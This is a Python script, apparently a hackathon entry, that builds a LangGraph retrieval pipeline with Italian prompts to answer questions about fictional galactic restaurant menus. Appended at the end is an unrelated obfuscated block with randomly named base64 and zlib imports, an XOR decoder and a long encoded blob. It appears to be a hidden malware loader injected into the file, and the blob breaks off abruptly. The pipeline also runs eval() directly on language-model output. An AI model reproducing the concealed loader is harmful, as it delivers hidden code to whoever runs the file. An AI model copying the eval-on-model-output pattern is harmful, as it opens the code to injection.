
from langchain_core.documents import Document
import json


import getpass
import os

from langchain_openai import ChatOpenAI

from BooleanQuery import boolean_searcher, BooleanQueryParser

llm = ChatOpenAI(
    model="gpt-4o",
    temperature=0,
    max_tokens=None,
    timeout=None,
    max_retries=0,
    api_key="",
    # base_url="...",
    # organization="...",
    # other params...
)

llm_json_mode=llm


#===========================================================================
#                            VECTORSTORE SETUP
#===========================================================================
from langchain.text_splitter import RecursiveCharacterTextSplitter
from langchain_community.document_loaders import TextLoader, PyPDFLoader
from langchain_community.retrievers import BM25Retriever
from langchain_community.vectorstores import FAISS



menu_paths = [
    os.path.join("Hackapizza Dataset/Menu_Final_txt", path) for path in os.listdir("Hackapizza Dataset/Menu_Final_txt") if path.endswith(".txt")
]
technical_paths = [
    "Hackapizza Dataset/Techs/Codice Galattico.txt",
    #"Techs/Manuale di Cucina.txt",
]
misc_paths = [
    ""
]

dist_file=open("Hackapizza Dataset/Techs/distanze.txt","r").read()

dish_mapping_path = "Hackapizza Dataset/Misc/dish_mapping.json"
with open(dish_mapping_path, "r") as f:
    dish_mapping = json.load(f)

import re


def roman_to_int(roman: str) -> int:
    roman_values = {'I': 1, 'V': 5, 'X': 10, 'L': 50, 'C': 100, 'D': 500, 'M': 1000}
    total = 0
    prev_value = 0

    for char in reversed(roman):
        value = roman_values.get(char, 0)
        if value < prev_value:
            total -= value
        else:
            total += value
        prev_value = value

    return total



def replace_roman_numerals(doc: Document) -> str:
    text = doc.page_content

    def replacement(match):
        roman_numeral = match.group()
        # Evitiamo di sostituire "I" se è a inizio frase
        if roman_numeral == "I" and (match.start() == 0 or text[match.start() - 2] in {'.', '!', '?'}):
            return roman_numeral
        return str(roman_to_int(roman_numeral))

    pattern = r"(?<![\w'])(M{0,4}(CM|CD|D?C{0,3})(XC|XL|L?X{0,3})(IX|IV|V?I{0,3}))(?![\w'])"
    return re.sub(pattern, replacement, text)




# Load menu documents
menu_docs = [TextLoader(path).load() for path in menu_paths]
menu_docs_list = [item for sublist in menu_docs for item in sublist]
# Load technical documents
tech_docs = [TextLoader(path).load() for path in technical_paths]
tech_docs_list = [item for sublist in tech_docs for item in sublist]
# Load misc documents
#misc_docs = [TextLoader(path).load() for path in misc_paths]
#misc_docs_list = [item for sublist in misc_docs for item in sublist]


# Funzione etichettatrice del nome del piatto
def dish_labeler(text :str):
    # Label dish name
    for dish in sorted(dish_mapping.keys(), key=lambda k: len(k), reverse=True):
        text = text.replace(
            dish, f"<dish>{dish}</dish>", -1
        )
    return text

def dish_labeler_doc_with_id(doc):
    # Label dish name
    for dish in sorted(dish_mapping.keys(), key=lambda k: len(k), reverse=True):
        doc.page_content = doc.page_content.replace(
            dish, f"<dish>{dish_mapping.get(dish)}</dish>", -1
        )
    return doc

def dish_labeler_doc_with_underscore(doc):
    # Label dish name
    for dish in sorted(dish_mapping.keys(), key=lambda k: len(k), reverse=True):
        doc.page_content = doc.page_content.replace(
            dish, f"<dish>{dish.replace(" ","_")}</dish>", -1
        )
    return doc


# Split documents
text_splitter = RecursiveCharacterTextSplitter.from_tiktoken_encoder(
    chunk_size=200, chunk_overlap=20
)



def my_splitter(menu_docs_list):
    doc_splits = []
    for id,doc in enumerate(menu_docs_list):
        list_pos = []
        for keyword in dish_mapping.keys():
            pos = doc.page_content.find(keyword)
            if pos != -1:
                list_pos.append((keyword, pos))

        list_pos = sorted(list_pos, key=lambda x: x[1])
        start = 0
        for _, end in list_pos:
            if start < end:
                doc_splits.append(Document(metadata={"id":id}, page_content=doc.page_content[start:end]))
                start = end
        doc_splits.append(Document(metadata={"id":id}, page_content=doc.page_content[start:]))

    return doc_splits


doc_splits = my_splitter(menu_docs_list)
tech_doc_splits = text_splitter.split_documents(tech_docs_list)





print([len(doc.page_content) > 0 for doc in doc_splits])

# check no empty splits
assert all([len(doc.page_content) > 0 for doc in doc_splits])
assert all([len(doc.page_content) > 0 for doc in tech_doc_splits])

# Label dish names
doc_splits = [dish_labeler_doc_with_underscore(doc) for doc in doc_splits]
tech_doc_splits = [dish_labeler_doc_with_underscore(doc) for doc in tech_doc_splits]

# Create retriever

tech_retriever = BM25Retriever.from_documents(tech_doc_splits, k=3, bm25_params={"k1":1.2, "b":0.75})



#============================= END OF VECTORSTORE ==============================







#===========================================================================
#                                PROMPTS
#===========================================================================
import json


# Post-processing
def format_docs(docs):
    return "\n\n".join(doc.page_content for doc in docs)




#===========================
# PROMPT
#===========================
prompt_boolean_search = """
Hai a disposizione:
    Una lista di keywords.
    Una query in linguaggio naturale.

Obiettivo:
    Converti la query in linguaggio naturale in una query booleana, utilizzando solamente le keywords fornite.

Input:
    Query: "{question}"
    Keywords: {selected_keywords}

Istruzioni:
    Usa esclusivamente le keywords presenti nella lista Keywords fornita nell'input.
    Costruisci la query booleana impiegando gli operatori AND, OR, NOT.
    Le parentesi () possono essere utilizzate per definire la priorità degli operatori.
    Ogni keyword deve essere racchiusa tra virgolette doppie "".
    Restituisci solamente la query booleana, racchiusa tra parentesi quadre [].
    Ricorda che le keyword usate nella query booleana devono essere scritte nello stesso modo di come sono scritte nella lista fornita.
    Usa correttamente le parentesi e i doppi apici ma non inserire altri caratteri speciali.


Esempio 1: 
    Query: "Quali sono i piatti cucinati su ristoranti di Pandora che contengono Alghe Fluo e Spinaci Radioattivi ma non vengono cucinati secondo la tecnica di Fusione a Freddo"
    Keywords: ["Alghe Fluo", "Spinaci Radioattivi", "Fusione a Freddo"]
    Output atteso: [("Alghe Fluo" AND "Spinaci Radioattivi" AND NOT "Fusione a Freddo")]

Esempio 2: 
    Query: "Quali sono i piatti cucinati su ristoranti di Pandora, evitando rigorosamente quelli cucinati con Alghe Fluo?"
    Keywords: ["Alghe Fluo"]
    Output atteso: [NOT "Alghe Fluo"]
    
Esempio 3: 
    Query: "Quali sono i piatti cucinati da chef con licenza YCD di grado 5 su ristoranti di Pandora, evitando rigorosamente quelli cucinati con Alghe Fluo?"
    Keywords: ["YCD","Pandora"]
    Output atteso: ["YCD" AND "Pandora"]
    
Esempio 4:
    Query: "Quali piatti sono preparati utilizzando almeno una tecnica di taglio e una di surgelamento, ma senza l'uso di Polvere di Crononite?

        Tecniche di taglio da integrare: 
        - taglio dimensionale a lame fotofilliche
        - affettamento a pulsazioni quantistiche
        
        
        Tecniche di surgelamento da integrare:
        - cryo-tessitura energetica polarizzata
        - congelamento bio-luminiscente sincronico"

    Keywords: ["Polvere di Crononite","taglio dimensionale a lame fotofilliche", "affettamento a pulsazioni quantistiche", "cryo-tessitura energetica polarizzata", "congelamento bio-luminiscente sincronico"]
    Output atteso: [(NOT "Polvere di Crononite") AND (("taglio dimensionale a lame fotofilliche" OR "affettamento a pulsazioni quantistiche") AND ("cryo-tessitura energetica polarizzata" OR "congelamento bio-luminiscente sincronico"))]
"""


#===========================================================================
#                            GRAPH SETUP
#===========================================================================
import operator
from typing_extensions import TypedDict
from typing import List, Annotated
from langchain_core.messages import HumanMessage, SystemMessage


class GraphState(TypedDict):
    """
    Graph state is a dictionary that contains information we want to propagate to, and modify in, each graph node.
    """

    question: str  # User question
    generation: str  # LLM generation
    max_retries: int  # Max number of retries for answer generation
    answers: int  # Number of answers generated
    loop_step: Annotated[int, operator.add]
    menu_query: str  # Menu expert query
    tech_query: str  # Technical expert query
    misc_query: str  # Misc expert query
    menu_expert_answer: dict  # Menu expert answer
    keywords_extractor_answer:dict
    menu_header_answer:dict
    tech_expert_answer:dict
    planet_distance_answer:list
    #misc_expert_answer: str  # Misc expert answer



from langchain.schema import Document
from langgraph.graph import END


### Nodes
def extract_keywords(state):
    print("---Extracting keywords---")
    question = state["question"]

    prompt_tecniche_comuni = """
        Dividi la seguente domanda in keyword, categorizzandole secondo le seguenti etichette:

            licenze chef: nomi delle licenze che si riferiscono agli chef presenti nella domanda.
            licenze tech: nomi delle licenze che si riferiscono a tecniche o ingredienti presenti nella domanda da ricercare nel manuale di cucina Sirius Cosmo.
            pianeti: nomi dei pianeti presenti nella domanda.
            ingredienti: nomi degli ingredienti presenti nella domanda.
            tecniche galattiche: nomi propri delle tecniche menzionate nella domanda, generalmente scritte con iniziale maiuscola.
            tecniche comuni: nomi comuni di tecniche menzionate nella domanda, generalmente scritte in minuscolo, spesso correlate al manuale Sirius Cosmo o al Codice Galattico.
            chef: nomi degli chef presenti nella domanda.
            ristoranti: nomi dei ristoranti presenti nella domanda.
            abilità: nomi delle abilità (specialmente se collegate al contesto dello chef).

        Requisiti:

            Output: Il risultato finale DEVE essere un JSON con la seguente struttura:

                {
                  "licenze chef": [ ... ],
                  "licenze tech": [ ... ],
                  "pianeti": [ ... ],
                  "ingredienti": [ ... ],
                  "tecniche galattiche": [ ... ],
                  "tecniche comuni": [ ... ],
                  "chef": [ ... ],
                  "ristoranti": [ ... ]
                }

            Integrità: Non modificare le keyword estratte; riportale esattamente come compaiono nella domanda.
            Formato delle keyword: Le keyword sono nomi propri che iniziano sempre con la lettera maiuscola. Non includere keyword che iniziano con la lettera minuscola.
            Caratteri speciali: Le keyword possono essere nomi inventati e contenere simboli speciali (escluso il carattere "?").
            Casi contestuali:
                Se una keyword è preceduta dalla frase "sono preparati", allora appartiene alla categoria tecniche galattiche o comuni.
                Se una keyword è preceduta da "richiedono", allora appartiene alla categoria licenze.
                Se una keyword è correlata al contesto dello chef (ad esempio, descrive le sue licenze), allora va inserita nella categoria licenze chef(riservando la categoria chef ai nomi propri degli chef).
                Codice di Galattiche e Sirius Cosmo non devono essere keyword.
                Nelle licenze chef scrivi solo il nome della licenza senza il grado.
                

            Esempio 1:
                Domanda: "Quali piatti, che necessitano almeno della licenza Psionica di grado 2 per essere preparati, serviti in un ristorante su Pandora, utilizzano Spore Quantiche, preparati tramite la tecnica di Vaporizzazione dallo chef Cannavacciuolo nel ristorante La Valle delle Lacrime?"
                Output atteso:
                    {
                      "licenze chef": [],
                      "licenze tech": ["Psionica 2"],
                      "pianeti": ["Pandora"],
                      "ingredienti": ["Spore Quantiche"],
                      "tecniche galattiche": ["Vaporizzazione"],
                      "tecniche comuni": [],
                      "chef": ["Cannavacciuolo"],
                      "ristoranti": ["La Valle delle Lacrime"]
                    }
            Esempio 2:
                Domanda: "Quali piatti, preparati da chef con licenza Psionica di grado 2, serviti in un ristorante su Pandora, utilizzano Spore Quantiche?"
                Output atteso:
                    {
                      "licenze chef": ["Psionica"],
                      "licenze tech": [],
                      "pianeti": ["Pandora"],
                      "ingredienti": ["Spore Quantiche"],
                      "tecniche galattiche": [],
                      "tecniche comuni": [],
                      "chef": [],
                      "ristoranti": []
                    }

            Esempio 3:
                Domanda: "Quali piatti sono preparati utilizzando sia tecniche di impasto che di taglio, ma senza l'uso di Spore Quantiche?"
                Output atteso:
                    {
                      "licenze chef": [],
                      "licenze tech": [],
                      "pianeti": [],
                      "ingredienti": ["Spore Quantiche"],
                      "tecniche galattiche": [],
                      "tecniche comuni": ["impasto", "taglio"],
                      "chef": [],
                      "ristoranti": []
                    }

            Esempio 4:
                Domanda: "Quali piatti, che richiedono una licenza Ultra Istinto di grado 2, utilizzano Spore Quantiche?"
                Output atteso:
                    {
                      "licenze chef": [],
                      "licenze tech": ["Ultra Istinto 2"],
                      "pianeti": [],
                      "ingredienti": ["Spore Quantiche"],
                      "tecniche galattiche": [],
                      "tecniche comuni": [],
                      "chef": [],
                      "ristoranti": []
                    }

        Domanda: """ + question



    response = llm.invoke(prompt_tecniche_comuni)

    start = response.content.find("{")
    end = response.content.rfind("}")

    keyword=json.loads(response.content[start:end + 1])

    for k in keyword:
        selected_keywords=keyword[k]
        if k != "tecniche comuni":
            selected_keywords = [token for token in selected_keywords if token[0].isupper()]
        keyword[k] = selected_keywords


    print(keyword)
    return {"keywords_extractor_answer": keyword}


def ask_to_tech_expert(state):
    print("---RETRIEVING FROM TECH---")

    question = state["question"]

    keywords = state["keywords_extractor_answer"]

    try:
        if keywords["licenze tech"] or keywords["tecniche comuni"]:


            query_rewrited = f"""Hai due liste. La prima contiene nomi di licenze, la seconda contiene nomi di tecniche. 
                                    Ritorna le tecniche che per essere eseguite necessitano le licenze e le tecniche contenute nella seguenti liste:
                                    licenze tech: {str(keywords["licenze tech"])}
                                    tecniche: {str(keywords["tecniche comuni"])}"""

            doc = tech_docs[0]

            rag_tech_prompt = """
            Hai a disposizione:
                Il Codice di Galattico che contiene informazioni sulle regole e licenze culinarie della ristorazione galattica.
                Una query in linguaggio naturale.

            Obiettivo:
                Analizza il testo e rispondi alla query utilizzando esclusivamente le informazioni presenti nel testo che ti è stato fornito.
                La risposta deve essere solo una lista di tutte le tecniche che rispondono alla domanda: ["tecnica1", "tecnica2"]

            Input:
                Testo: {context}
                Query: {query}
                

            Esempio:
                se nella lista delle licenze c'e' psionica non base dovrai trovare le tecniche che richedono licenza pisonica di grado superiore a 1.
                Ricordati di trovare sempre la tecnica piu' specifica ad esempio se la tecnica che rispetta la licenza e' una tecnica di congelamento dovrai inserire il nome proprio della tecnica esempio:"congelamento a raggi x" e non congelamento
                
            """

            formatted_rag_prompt = rag_tech_prompt.format(
                context=doc,
                query=query_rewrited
            )

            response = llm_json_mode.invoke([HumanMessage(content=formatted_rag_prompt)])
            # print(response.content)
            start = response.content.find("[")
            end = response.content.rfind("]")

            tech_retrieved = eval(response.content[start:end + 1])

            print(tech_retrieved)

            if tech_retrieved:
                response = llm.invoke(
                    f"""Riscrivi la query seguente eliminando solo i riferimenti alle licenze o alle tecniche. All'interno della nella nuova query, integra le tecniche che richiedono licenze.
                            Ricorda che il signicato della query deve rimanere invariato.
                            Inoltre se nella domanda e' presente di Sirius Cosmo eliminalo.
                            
                            Query: "{question}"
                            Lista delle tecniche da integrare: {tech_retrieved}""")
                start = response.content.find('"')
                end = response.content.rfind('"')
                question = response.content[start + 1:end]
                print("Tech question:", question)

            keywords["tecniche galattiche"] = tech_retrieved



            return {"keywords": keywords, "question": question}
    except Exception as e:
        print("Tech node error:", e)

    return {}

def ask_to_distance_expert(state):
    print("---RETRIEVING FROM DISTANCE---")
    question = state["question"]

    keywords = state["keywords_extractor_answer"]

    try:
        if "anni luce" in question:

            selected_keywords = []
            selected_keywords.extend(keywords["pianeti"])

            if not selected_keywords:
                return {"planet_distance_answer": []}


            prompt = f"""
            Hai a disposizione:
                Un testo contenente tutte le distanze tra i pianeti della galassia.
                Una query in linguaggio naturale.

            Obiettivo:
                Dopo aver analizzato il testo delle distanze trova i pianeti che rispondono alla domanda.
                Ritorna solo i pianeti in una lista python.
                
                
            Input:
                Query: "{question}"
                Testo distanze: "{dist_file}"
                
            
            Esempio: Query:"Quali pianeti sono in un raggio di 134 anni luce dal pianeta Urano?"
                     Output:["Pianeta 1", "Pianeta 2"]
                     
            Attenzione: se nella domanda c'e' scritto di includere il pianeta di partenza ricordati di inserirlo nella risposta.
                
            """

            response = llm.invoke(prompt)

            start = response.content.find("[")
            end = response.content.rfind("]")
            planet_ok= eval(response.content[start:end + 1])
            print("Planet match: ",planet_ok)

            if planet_ok:
                response = llm.invoke(f"""Riscrivi la seguente query escludendo la parte relativa alle distanze e aggiungi, al suo interno, la risposta con le distanze dei pianeti. Query: '{question}' Lista dei pianeti da integrare: {planet_ok}""")
                start = response.content.find('"')
                end = response.content.rfind('"')
                question = response.content[start+1:end]
                print("Question",question)

            return {"planet_distance_answer": planet_ok, "question": question}
    except Exception as e:
        print("Distance node error",e)

    return {"planet_distance_answer": []}

def ask_to_menu_header_expert(state):
    print("---RETRIEVING FROM MENU Headers---")
    question = state["question"]
    keywords=state["keywords_extractor_answer"]

    try:
        if keywords["ristoranti"] or keywords["chef"] or keywords["pianeti"] or keywords["licenze chef"]:

            selected_keywords = []
            selected_keywords.extend(keywords["ristoranti"])
            selected_keywords.extend(keywords["chef"])
            selected_keywords.extend(keywords["licenze chef"])

            if state["planet_distance_answer"]:
                selected_keywords.extend(state["planet_distance_answer"])
            else:
                selected_keywords.extend(keywords["pianeti"])


            print(selected_keywords)


            if not selected_keywords:
                return {"menu_header_answer":""}

            prompt = prompt_boolean_search.format(question=question, selected_keywords=selected_keywords)

            response = llm.invoke(prompt)

            start = response.content.find("[")
            end = response.content.rfind("]")

            boolean_query=response.content[start:end + 1]
            print("Boolean query",boolean_query)
            parser = BooleanQueryParser(boolean_query)
            parsed_tree = parser.parse()
            print("Parsed query",parsed_tree)

            dict_menu_headers = boolean_searcher(parsed_tree, doc_splits, lower=False, header=True)

            print(dict_menu_headers)
            if not dict_menu_headers:
                return {"menu_header_answer":[-1]}

            if keywords["licenze chef"]:
                response=llm.invoke(f"""Dati in input una query e un dizionario nel formato ristorante_id -> [informazioni ristorante], restituisci una lista contenente esclusivamente gli ID dei ristoranti in cui i gradi delle licenze degli chef soddisfano i requisiti specificati nella query.

                                            Query: {question}
                                            Dizionario: {dict_menu_headers}
                                            
                                            Restituisci solo la lista degli ID tra il token $, ad esempio:  $[1, 5, 6]$ """ )
                #print("Restituisci query",response.content)
                start = response.content.find("$")
                end = response.content.rfind("$")
                id_resturant = eval(response.content[start+1:end])
                print("id_resturant",id_resturant)
                return {"menu_header_answer": id_resturant}

            return {"menu_header_answer":dict_menu_headers.keys()}
    except Exception as e:
        print("Header menu node error", e)

    return {"menu_header_answer":""}

def ask_to_menu_corpus_expert(state):
    print("---RETRIEVING FROM MENU CORPUS---")
    question = state["question"]

    keywords = state["keywords_extractor_answer"]

    try:

        if keywords["tecniche galattiche"] or keywords["ingredienti"]:
            selected_keywords = []
            selected_keywords.extend(keywords["tecniche galattiche"])
            selected_keywords.extend(keywords["ingredienti"])
            print(selected_keywords)

            prompt = prompt_boolean_search.format(question=question, selected_keywords=selected_keywords)
            response = llm.invoke(prompt)

            start = response.content.find("[")
            end = response.content.rfind("]")



            boolean_query = response.content[start:end + 1]
            print(f"llm response: {boolean_query}")

            parser = BooleanQueryParser(boolean_query)
            parsed_tree = parser.parse()
            print(f"parsed query: {parsed_tree}")

            dict_menu_corpus = boolean_searcher(parsed_tree, doc_splits)


            id_extracted_headers=state["menu_header_answer"]

            if dict_menu_corpus:
                if id_extracted_headers:
                    new_dict={}
                    for id in dict_menu_corpus:                 ### intersezione tra i due id
                        if id in id_extracted_headers:
                            #print(dict_menu_corpus[id])
                            new_dict[id]= f"Ristorante:{id}\n"+  "\n".join(dict_menu_corpus[id])
                    dict_menu_corpus =  new_dict
                    return {"menu_expert_answer": dict_menu_corpus}
                    #print(new_dict)

                return {"menu_expert_answer":dict_menu_corpus}
            #elif dict_menu_headers:
            #    return {"menu_expert_answer": dict_menu_headers}
    except Exception as e:
        print("Corpus menu node error",e)

    return {"menu_expert_answer":{}}





def generate(state):
    print("---GENERATING ANSWER---")
    question = state["question"]
    #print(state)
    menu_expert_answer = state["menu_expert_answer"]


    dishes=set()
    for x in menu_expert_answer:
        if isinstance(menu_expert_answer[x], str):
            matches = re.findall(r"<dish>(.*?)</dish>", menu_expert_answer[x])
            for match in matches:
                dishes.add(match)
        else:
            for y in menu_expert_answer[x]:
                matches = re.findall(r"<dish>(.*?)</dish>", y)

                for match in matches:
                    dishes.add(match)

    if len(dishes)>30:
        return {"generation": {'dishes': []}}
    return {"generation": {'dishes':list(dishes)}}

#===========================================================================
#                            LANGCHAIN GRAPH
#===========================================================================
from langgraph.graph import StateGraph
from IPython.display import Image, display


workflow = StateGraph(GraphState)
#---------------------------
#           NODES
#---------------------------
workflow.add_node("keywords_extractor", extract_keywords)
workflow.add_node("distance_expert", ask_to_distance_expert)  # retrieve
workflow.add_node("menu_header_expert", ask_to_menu_header_expert)  # retrieve
workflow.add_node("menu_corpus_expert", ask_to_menu_corpus_expert)  # retrieve
workflow.add_node("tech_expert", ask_to_tech_expert)  # retrieve
workflow.add_node("answer_expert", generate)  # generate


#---------------------------
#           EDGES
#---------------------------
workflow.set_entry_point("keywords_extractor")
workflow.add_edge("keywords_extractor","tech_expert")
workflow.add_edge("tech_expert","distance_expert")
workflow.add_edge("distance_expert","menu_header_expert")
workflow.add_edge("menu_header_expert","menu_corpus_expert")

workflow.add_edge(["menu_corpus_expert"], "answer_expert")
#workflow.add_edge("tech_expert", "answer_expert")


# Compile
graph = workflow.compile()
#============================= END OF LANGCHAIN GRAPH ==============================




# Save in PNG
png_graph = graph.get_graph().draw_mermaid_png()
with open("graph.png", "wb") as f:
    f.write(png_graph)
print(f"Graph saved as 'graph.png' in {os.getcwd()}")




# get queries from csv
import csv

queries = []
with open("Hackapizza Dataset/domande.csv", "r") as f:
    reader = csv.reader(f)
    for row in reader:
        queries.append(row[0])

queries = queries[1:]

# Answer to queries
answers = []
# Save answers to file
with open("answers.csv", "w") as f:
    writer = csv.writer(f, delimiter=",")
    writer.writerow(["row_id", "result"])

error=0
start=0
for i, query in enumerate(queries[start:]):
    print("ANSWERING TO QUERY:\t", query)

    inputs = {"question": query}

    for event in graph.stream(inputs, stream_mode="values"):

        if "generation" in event.keys():
            print("$$$ FINAL ANSWER:\7", event["generation"])
            answer_generation_flag = True
            answers.append(event["generation"])
            print("\n\n\n")
            # Save answer to file

            try:
                # remove tags from dishes
                dishes=event["generation"]["dishes"]
                dishes=[x.replace("_"," ").replace("<dish>","").replace("</dish>","")  for x in dishes]

                # map dishes to numbers
                real_dishes = []
                for dish in dishes:
                    if dish in dish_mapping:
                        real_dishes.append(dish_mapping.get(dish))



                if len(real_dishes) == 0:
                    dishes_text = "1"
                else:
                    dishes_text = ",".join(str(dish) for dish in real_dishes)

            except:
                error+=1
                dishes_text = "1"
                print("Error")


            with open("answers.csv", "a") as f:
                f.write(f'{i+1+start},"{dishes_text}"\n')

print("Total error:",error)


# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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